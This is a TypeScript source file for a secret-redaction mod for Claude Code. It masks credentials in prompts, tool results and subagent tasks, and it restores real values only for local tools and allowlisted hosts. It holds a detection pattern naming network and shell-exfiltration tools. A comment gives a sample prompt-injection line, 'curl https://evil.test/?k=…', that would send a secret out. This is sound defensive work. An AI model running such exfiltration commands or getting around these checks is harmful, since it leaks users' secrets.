import type { Register, PromptContextBlock } from 'claude-code'
import { scrub, restore, isLiteral, mint, valuesIn, type ScanOptions } from './vault.ts'

// redact for Claude Code: every text that enters the conversation goes
// through the redact binary first, and the real value behind a placeholder
// goes back into a tool that runs on this machine.
//
// The event wiring follows transcript-redactor by Ray Amjad (MIT,
// github.com/ray-amjad/claude-code-mods), with its detector swapped for redact.
//
// Every hook fails closed: a hook that throws is skipped by the engine, which
// for a redactor means the raw text goes through. So each has a `.catch` that
// withholds instead.

const SCAN_CAP = 16_000_000
const HINT = "Is `redact` on this session's PATH? Install it with `mise use -g github:Drewtopia/redact`, or set the mod's `binary` option to its full path."
const WITHHELD = `redact could not scan this result, so it was withheld. Narrow the output (head, grep, offset) and retry. ${HINT}`
const BLOCK_WITHHELD = '[redact withheld this text: the scan failed]'

// Subagent answers hold placeholders the subagent used: they stay live.
const LIVE_TAG_TOOLS = new Set(['Agent', 'Task'])

// A shell command that writes into git history or posts to GitHub, GitLab or
// Azure DevOps keeps its placeholders, so a commit message or issue body
// cannot carry a real value off the machine.
//
// This reads the command's text, not its meaning: a shell has too many ways to
// split, quote, alias or expand a word for a parser here to follow them all.
// So it fails closed. With quote and escape characters taken out, a command
// that names a tool anywhere and one of its publishing words anywhere (in
// either order) publishes: `git log --grep=commit` keeps its placeholders too.
// Each test is one pass over the text, so no command can make it slow.
// Each line: words that must all appear, the tool first.
const PUBLISH_WORDS: RegExp[][] = [
  ['git', 'commit|tag|notes|send-email'],
  ['gh', 'issue|pr|release|gist|discussion|api'],
  ['gh', 'repo', 'create|edit'],
  ['glab', 'issue|mr|release|snippet|api'],
  ['az', 'repos|boards|devops|pipelines|rest'],
].map(([tool, ...words]) => [
  // A tool's name on its own, or at the end of a path: `C:\Git\cmd\git.exe`.
  new RegExp(String.raw`(?:^|[^\w.-])${tool}(?:\.exe|\.cmd)?(?![\w.-])`, 'i'),
  ...words.map((w) => new RegExp(String.raw`(?:^|[^\w.-])(?:${w})(?![\w.-])`, 'i')),
])

function publishes(command: string): boolean {
  // Bash reads `gi\t`, `"g"it` and `$'git'` as git; PowerShell does the same
  // with a backtick. Removing those characters joins the word again, and
  // reading them as spaces keeps a Windows path's parts apart.
  const quotes = /["'`\\$]/g
  const forms = [command.replace(quotes, ''), command.replace(quotes, ' ')]
  return forms.some((text) => PUBLISH_WORDS.some((all) => all.every((re) => re.test(text))))
}

// Claude Code's shell tools, each with the characters that make a restored
// value run as code in it. PowerShell also reads @ , % as syntax, curly
// quotes as quotes and en/em dashes as a parameter's dash.
const SHELL_ACTIVE: Record<string, RegExp> = {
  Bash: /[\s$`"'\\;&|<>()*?[\]{}#~]|[\x00-\x1f\x7f]/,
  PowerShell: /[\s$`"'\\;&|<>()*?[\]{}#~@,%\u2013-\u2015\u2018-\u201f]|[\x00-\x1f\x7f]/,
}

// A `command` override can switch hiding off, and its glob's `*` matches
// anything, so `gh pr view 1 && git log` would turn it on for the git log too.
// The command is passed on only when every character is one that neither
// shell reads as a second command: no ; & | < > $ ` ( ) { } or new line.
const ONE_COMMAND = /^[\w .\/:=@%+,~'"#*?-]*$/
const overrideCommand = (command: unknown): string | undefined =>
  typeof command === 'string' && ONE_COMMAND.test(command) ? command : undefined

// Only these hosts may get a real value from a shell command (`restoreHosts`).
// A command that names a host anywhere a shell or a network tool reads one gets
// no real value unless every such host is listed. Like the publish check, this
// reads text: it stops `curl https://evil.test/?k=[…]` from a prompt
// injection, not a host built while the command runs.
const NETWORK_TOOL = new RegExp(
  String.raw`(?:^|[^\w.-])(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|lftp|sftp|scp|ssh|rsync|http|https|xh|aria2c|dig|nslookup|host|ping|traceroute|openssl|mail|sendmail|mutt|smbclient|docker|podman|npm|pip|invoke-webrequest|invoke-restmethod|iwr|irm|start-bitstransfer|test-netconnection|resolve-dnsname|send-mailmessage)(?:\.exe)?(?![\w.-])`,
  'i',
)
const URL = /\b[a-z][a-z0-9+.-]*:\/\/([^\s/?#"'`]*)\S*/gi
// Host names and every way to write an IPv4 address that a resolver takes:
// dotted (`1.1`, `1.2.3.4`), one integer (`16843009`) and hex (`0x01010101`).
const HOST = String.raw`(?:[a-z0-9-]+\.)+[a-z]{2,}|\d+(?:\.\d+){1,3}|\d{7,}|0x[0-9a-f]+(?:\.[0-9a-fx]+)*|localhost|\[[0-9a-f:.]+\]`
// Hosts a shell reaches with no network tool named: user@host (ssh, git
// remotes, mail), /dev/tcp/host in Bash, and \\host\share in PowerShell.
const ALWAYS_HOST = new RegExp(String.raw`[\w.+-]@(${HOST})|/dev/(?:tcp|udp)/([^/\s]+)|\\\\([^\\\s]+)\\`, 'gi')
// Every host-shaped part of the command, option values included
// (`-xproxy.test`, `--resolve a:443:host`), with or without a network tool:
// an interpreter reaches a host with no tool named (`node -e "…connect(80,'h')"`).
const ANY_HOST = new RegExp(String.raw`(?<![\w.])(${HOST})(?![\w-])([/:])?`, 'gi')
// A file name, unless a / or : after it makes it read as a host.
const FILE_EXT = /\.(?:json|ya?ml|toml|txt|md|csv|xml|html?|js|ts|mjs|py|sh|ps1|bat|cmd|exe|env|pem|key|crt|log|conf|ini|tar|gz|zip)$/i

type HostCheck = { unlisted: string[]; noHost: boolean }

function hostOf(authority: string): string {
  const h = authority.slice(authority.lastIndexOf('@') + 1).toLowerCase()
  return h.startsWith('[') ? h.slice(0, h.indexOf(']') + 1) : h.replace(/:\d*$/, '')
}

// The hosts in `command` that are not on the list, and whether it runs a
// network tool without naming any host at all.
function checkHosts(command: string, allowed: string[]): HostCheck {
  const hosts = new Set<string>()
  let tool = false
  // A shell drops quotes and escapes (`c''url`, `cu\rl`, PowerShell's i`wr),
  // so the text is read as written, with them removed, and with them as spaces.
  // A placeholder's hex (`[SECRET-12345678]`) is not an address.
  const bare = command.replace(/\[[A-Z][A-Z0-9-]*-[0-9a-f]{8}\]/g, ' ')
  for (const text of [bare, bare.replace(/["'`\\]/g, ''), bare.replace(/["'`\\]/g, ' ')]) {
    for (const m of text.matchAll(URL)) if (m[1]) hosts.add(hostOf(m[1]))
    for (const m of text.matchAll(ALWAYS_HOST)) hosts.add(hostOf(m[1] ?? m[2] ?? m[3] ?? ''))
    for (const m of text.replace(URL, ' ').matchAll(ANY_HOST)) {
      if (m[1] && (m[2] || !FILE_EXT.test(m[1]))) hosts.add(hostOf(m[1]))
    }
    if (!NETWORK_TOOL.test(text)) continue
    tool = true
    // A host with no dot, as scp, ssh and nc take it: `box:/path`, `box:22`.
    for (const m of text.replace(URL, ' ').matchAll(/(?<![\w.:-])([a-z][a-z0-9-]*):(?:\/|\d+(?![\w-]))/gi)) hosts.add(m[1]!.toLowerCase())
    // And the first plain word after a tool whose first argument is a host.
    for (const m of text.matchAll(/(?:^|[^\w.-])(?:nc|ncat|netcat|telnet|ssh|ping|dig|nslookup|host|ftp|sftp|traceroute)(?:\.exe)?(?:\s+-\S+)*\s+([a-z][\w-]*)(?![\w.:@-])/gi)) hosts.add(m[1]!.toLowerCase())
  }
  hosts.delete('')
  const ok = (h: string) => allowed.some((a) => h === a || h.endsWith(`.${a}`))
  return { unlisted: [...hosts].filter((h) => !ok(h)), noHost: tool && hosts.size === 0 }
}

const MEDIA_FILE = /\.(?:png|jpe?g|gif|webp|bmp|tiff?|heic|pdf)$/i

type WalkState = { incomplete: boolean }
const MAX_DEPTH = 64
const CONTEXT_MAX = 1024

// `name: value` for each short one-line field, so a rule keyed on the field
// name (`password: …`) still fires on a value stored apart from its name.
function fields(value: unknown, out: string[] = [], depth = 0): string[] {
  if (value === null || typeof value !== 'object' || depth >= MAX_DEPTH) return out
  for (const [k, v] of Object.entries(value)) {
    if (typeof v === 'string' || typeof v === 'number' || typeof v === 'bigint') {
      const line = `${k}: ${v}`
      if (line.length <= CONTEXT_MAX && !line.includes('\n')) out.push(line)
    } else fields(v, out, depth + 1)
  }
  return out
}

// Every string in plain data, object keys included. A part it cannot rewrite
// (too deep, not plain data, a number that holds a hidden value) sets
// `incomplete`, and the hook then withholds the whole result.
function walk(value: unknown, fn: (s: string) => string, st: WalkState, depth = 0): unknown {
  if (typeof value === 'string') return fn(value)
  if (typeof value === 'number' || typeof value === 'bigint') {
    if (fn(String(value)) !== String(value)) st.incomplete = true
    return value
  }
  if (value === null || typeof value !== 'object') return value
  if (ArrayBuffer.isView(value) || value instanceof ArrayBuffer) return value
  if (depth >= MAX_DEPTH) {
    st.incomplete = true
    return value
  }
  if (Array.isArray(value)) return value.map((v) => walk(v, fn, st, depth + 1))
  const proto = Object.getPrototypeOf(value)
  if (proto !== Object.prototype && proto !== null) {
    st.incomplete = true
    return value
  }
  const out: Record<string, unknown> = {}
  for (const [k, v] of Object.entries(value as Record<string, unknown>)) out[fn(k)] = walk(v, fn, st, depth + 1)
  return out
}

type Budget = { budget: { remainingMs: number } }

const countHidden = (tags: Set<string>): number => [...tags].filter((t) => !isLiteral(t)).length

let warned = false
// The full path locate found after the bare name failed, used from then on.
let located: string | undefined

// Masks `texts` in one run of the binary, inside the hook's time budget.
async function run($: any, next: Budget, binary: string, texts: string[], extra: Partial<ScanOptions> = {}) {
  if (texts.some((t) => t.length > SCAN_CAP)) throw new Error('redact: text too large to scan')
  const timeoutMs = next.budget.remainingMs - 300
  if (timeoutMs < 200) throw new Error('redact: out of time')
  return scrub($, texts, {
    binary: located ?? binary,
    timeoutMs,
    ...extra,
    onLocated: (path) => {
      located = path
    },
    onBroken: (why) => {
      if (warned) return
      warned = true
      try { $.ui.toast(`redact: ${why}. Withholding text until it runs. ${HINT}`) } catch {}
    },
  })
}

export const register: Register = (on, options) => {
  const opts = options as Record<string, unknown>
  const binary = String(opts.binary || 'redact')
  const notify = opts.notify !== false && opts.notify !== 'false'
  const restoreTools = new Set(
    String(opts.restoreTools ?? 'Bash,PowerShell,Write,Edit,MultiEdit,NotebookEdit,Read,Glob,Grep')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean),
  )
  const restoreHosts = String(opts.restoreHosts ?? '')
    .split(',')
    .map((s) => s.trim().toLowerCase().replace(/^\*?\./, ''))
    .filter(Boolean)

  // 1. What the person types, and context a hook above attached to it.
  on('prompt.submit', async ($, e, next) => {
    const context = e.context ?? []
    const { masked, tags } = await run($, next, binary, [e.text, ...context])
    if (tags.size === 0) return next(e)
    const n = countHidden(tags)
    if (n > 0 && notify) $.ui.toast(`redact: hid ${n} value(s) from the prompt`)
    return next({ ...e, text: masked[0] ?? '', ...(e.context ? { context: masked.slice(1) } : {}) })
  }).catch(($, e, next) => (next.called ? next(e) : { drop: `redact failed to scan this prompt, so it was not sent. ${HINT}` }))

  // 2. Every tool call. In: a placeholder becomes its real value, only for a
  //    tool that runs on this machine. Out: result, text and context.
  on('tool.call', async ($, e, next) => {
    const command = e.tool in SHELL_ACTIVE ? (e as { command?: unknown }).command : undefined
    const isPublish = typeof command === 'string' && publishes(command)
    const isLocal = restoreTools.has(e.tool) && !isPublish
    // Real values this call was handed: whatever the tool prints of them
    // comes back hidden, even bare and short, where no rule would fire.
    const handed = new Set<string>()
    const input = isLocal ? (walk({ ...e }, (s) => restore(s, (v) => handed.add(v)), { incomplete: false }) as typeof e) : e
    const active = SHELL_ACTIVE[e.tool]
    if (active && [...handed].some((v) => active.test(v))) {
      return {
        deny: 'redact: a value in this command holds shell characters, so it was not put into the shell, where it could run as code. Write it to a file with the Write tool and have the command read that file instead.',
      }
    }
    if (active && handed.size > 0 && typeof command === 'string') {
      const { unlisted, noHost } = checkHosts(command, restoreHosts)
      if (noHost) {
        return { deny: 'redact: this command runs a network tool but names no host the redact mod can read, so it was not given a real value. Name the URL in full (https://host/...).' }
      }
      if (unlisted.length > 0) {
        return {
          deny: `redact: this command would send a real value to ${unlisted.join(', ')}, which is not on the redact mod's restoreHosts list, so it was not run. If the person trusts the host, they can add it to restoreHosts in the mod's settings.`,
        }
      }
    }
    const r = await next(input)
    const scan = { command: overrideCommand(command), handed }
    if (r.deny !== undefined) {
      // A refusal from beneath may quote the input it refused, real values and all.
      const d = await run($, next, binary, [r.deny], { ...scan, escape: true })
      return d.tags.size === 0 ? r : { deny: d.masked[0] ?? WITHHELD }
    }

    const strings: string[] = []
    const st: WalkState = { incomplete: false }
    walk(r.result, (s) => (strings.push(s), s), st)
    // Part of the result could not be read (too deep, or not plain data), so
    // it was never scanned: withhold the whole result rather than pass it raw.
    if (st.incomplete) return { deny: 'redact: part of this result could not be scanned (too deep, or not plain data), so it was withheld. Narrow the call and retry.' }
    if (r.text !== undefined) strings.push(r.text)
    for (const c of r.context ?? []) strings.push(c)
    const unique = [...new Set(strings)]
    const named = fields(r.result).join('\n')
    // Keep JSON structure for contextual rules, including fields too long or
    // multiline for `fields`. Its escaped values are decoded before rewriting.
    const structured = typeof r.result === 'object' && r.result !== null
      ? JSON.stringify(r.result, (_key, value) => typeof value === 'bigint' ? String(value) : value)
      : ''
    const texts = [named, structured, ...unique]
    const { masked, tags } = await run($, next, binary, texts, { ...scan, escape: !LIVE_TAG_TOOLS.has(e.tool) })
    if (tags.size === 0) return r

    const leaves = masked.slice(2)
    const lookup = new Map(unique.map((s, i) => [s, leaves[i] ?? s]))
    // Values this scan found with their field name, longest first. A placeholder
    // already in the result (a subagent's answer) was not found here.
    const inContext = [...valuesIn(masked[0] ?? '')].filter(([, t]) => tags.has(t))
    for (const [raw, tag] of valuesIn(masked[1] ?? '')) {
      if (!tags.has(tag)) continue
      // A match that cuts through JSON syntax cannot be mapped safely: throwing
      // here makes the hook withhold the result through its catch handler.
      const value: string = JSON.parse(`"${raw}"`)
      inContext.push([value, mint(tag.slice(1, -10), value, tags)])
    }
    inContext.sort(([a], [b]) => b.length - a.length)
    // Where a hidden value can be put back: the whole string, or inside it when
    // it is long enough not to match by chance.
    const sitsIn = (s: string, v: string) => s === v || (v.length >= 4 && s.includes(v))
    const replaceAll = (s: string, found: [string, string][]): string => {
      let out = s
      for (const [v, tag] of found) out = out === v ? tag : v.length >= 4 ? out.split(v).join(tag) : out
      return out
    }
    // One that sits in no single string (it ran from a name into its value) cannot be put back.
    const placed = ([v]: [string, string]) => unique.some((s) => sitsIn(s, v))
    if (!inContext.every(placed)) return { deny: 'redact: a hidden value in this result could not be put back in place, so the result was withheld. Narrow the call and retry.' }
    const fix = (s: string): string => {
      const masked = lookup.get(s) ?? s
      // A value found with its field name can hold one this string's own scan
      // hid (a token on one line of a password). Hiding the inner one first
      // would leave the rest of the password showing, so the string is rebuilt
      // from its raw text, longest value first. Its own finds include the
      // LITERAL tags that stand for placeholder text, so that text stays escaped.
      const byName = inContext.filter(([v]) => sitsIn(s, v))
      if (byName.length === 0) return masked
      const ownFinds = [...valuesIn(masked, { literals: true })]
      // A short value can only be put back where it is the whole string.
      if (ownFinds.some(([v]) => !sitsIn(s, v))) throw new Error('redact: a hidden value cannot be placed')
      return replaceAll(s, [...byName, ...ownFinds].sort(([a], [b]) => b.length - a.length))
    }
    const st2: WalkState = { incomplete: false }
    const result = walk(r.result, fix, st2)
    if (st2.incomplete) return { deny: 'redact: a hidden value sits in a number in this result, which cannot hold a placeholder, so the result was withheld.' }
    const n = countHidden(tags)
    if (notify && n > 0) $.ui.notice(e.tool_use_id, `redact: hid ${n} value(s)`)
    const context = r.context ? { context: r.context.map(fix) } : {}
    if (r.isError) return { isError: true as const, result, text: r.text === undefined ? undefined : fix(r.text), ...context }
    return { result, ...context } as typeof r
  // A refusal, never a result: a string where the tool's output object goes
  // breaks its shape.
  }).catch(() => ({ deny: WITHHELD }))

  // 3. The blocks on the first message: CLAUDE.md and the engine's context.
  on('prompt.context', async ($, e, next) => {
    const r = await next(e)
    const { masked, tags } = await run($, next, binary, r.blocks.map((b) => b.text))
    if (tags.size === 0) return r
    // The raw files behind a rewritten CLAUDE.md would carry the value on to
    // the hooks above, so they are left out once any block changed.
    const blocks: PromptContextBlock[] = r.blocks.map((b, i) => ({ ...b, text: masked[i] ?? BLOCK_WITHHELD }))
    return { blocks }
  }).catch(async ($, e, next) => {
    const r = await next(e)
    return { blocks: r.blocks.map((b) => ({ ...b, text: BLOCK_WITHHELD })) }
  })

  // 4. What the engine injects after the first message: an @-file, a diff of
  //    a file that changed on disk, a nested CLAUDE.md, a hook's context.
  on('prompt.attachment', async ($, e, next) => {
    const r = await next(e)
    if (r.text == null) return r
    // File text: a placeholder in it stands for its own text, never the value.
    const escape = e.type === 'file' || e.type === 'edited_text_file'
    const { masked, tags } = await run($, next, binary, [r.text], { escape })
    return tags.size === 0 ? r : { text: masked[0] ?? BLOCK_WITHHELD }
  }).catch(() => ({ text: BLOCK_WITHHELD }))

  // 5. A file named with @ is read with no tool call, and its raw text is
  //    stored in the transcript whatever the model is shown. So a file that
  //    holds anything to hide is refused before it is read; the Read tool's
  //    result is scrubbed, so the model is pointed there.
  on('prompt.mention', async ($, e, next) => {
    if (MEDIA_FILE.test(e.path)) return next(e)
    let text: string
    try {
      text = await $.fs.read(e.path)
    } catch {
      if (!(await $.fs.exists(e.path))) return next(e)
      return { deny: 'redact: could not check this file; ask Claude to Read it instead' }
    }
    // UTF-16 text reads as UTF-8 with a NUL beside each ASCII character.
    const { tags } = await run($, next, binary, [text.replaceAll('\u0000', '')])
    if (tags.size > 0) return { deny: 'redact: this file holds something to hide; ask Claude to Read it instead, so those parts come back as placeholders' }
    return next(e)
  }).catch(($, e, next) => (next.called ? next(e) : { deny: 'redact: could not check this file' }))

  // 6. A subagent's task: a second layer for a value that reached the prompt
  //    some other way. A workflow agent's prompt can only be refused.
  on('agent.spawn', async ($, e, next) => {
    const { masked, tags } = await run($, next, binary, [e.prompt, e.description])
    if (tags.size === 0) return next(e)
    if (e.workflow) return { deny: "redact: this workflow agent's prompt holds something to hide, and a workflow prompt cannot be rewritten. Pass the value by a file or an env var instead." }
    return next({ ...e, prompt: masked[0] ?? '', description: masked[1] ?? '' })
  }).catch(($, e, next) => (next.called ? next(e) : { deny: 'redact failed to scan this task, so the subagent was not started.' }))
}
